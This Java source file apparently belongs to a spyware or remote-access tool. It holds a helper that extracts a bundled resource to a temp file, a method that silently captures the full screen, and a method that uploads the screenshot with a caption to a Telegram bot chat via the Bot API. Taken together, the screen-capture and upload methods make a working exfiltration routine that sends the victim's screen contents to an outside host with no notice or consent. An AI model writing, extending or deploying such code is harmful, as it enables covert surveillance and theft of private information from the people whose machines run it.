package Waiters;

import Start.StartIsHere;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

import static Waiters.TelegramBotSender.BOT_TOKEN;
import static Waiters.TelegramBotSender.CHAT_ID;

public class Extractor {
    public static String extractResource(String resourcePath) {
        try {
            InputStream stream = StartIsHere.class.getResourceAsStream(resourcePath);
            if (stream == null) {
                throw new IOException("Ресурс не найден: " + resourcePath);
            }

            File tempFile = File.createTempFile("resource_", ".png");
            Files.copy(stream, tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            return tempFile.getAbsolutePath();
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return resourcePath;
    }

    //Extract Screenshot
    static byte[] captureScreenshot() throws AWTException, IOException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenshot = robot.createScreenCapture(screenRect);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenshot, "png", baos);
        return baos.toByteArray();
    }

    static void sendPhotoWithCaption(byte[] imageBytes, String caption) throws IOException {
        String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        String boundary = "------------------------" + System.currentTimeMillis();
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (OutputStream outputStream = connection.getOutputStream();
             PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, StandardCharsets.UTF_8), true)) {

            // Chat ID
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            writer.append(CHAT_ID).append("\r\n").flush();

            // Caption
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            writer.append(caption).append("\r\n").flush();

            // Photo
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n");
            writer.append("Content-Type: image/png\r\n\r\n");
            writer.flush();

            outputStream.write(imageBytes);
            outputStream.flush();

            writer.append("\r\n").flush();
            writer.append("--").append(boundary).append("--\r\n").flush();
        }

        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            System.out.println("Фото и сообщение успешно отправлены!");
        } else {
            System.out.println("Ошибка отправки фото. Код: " + responseCode);
        }
        connection.disconnect();
    }
}
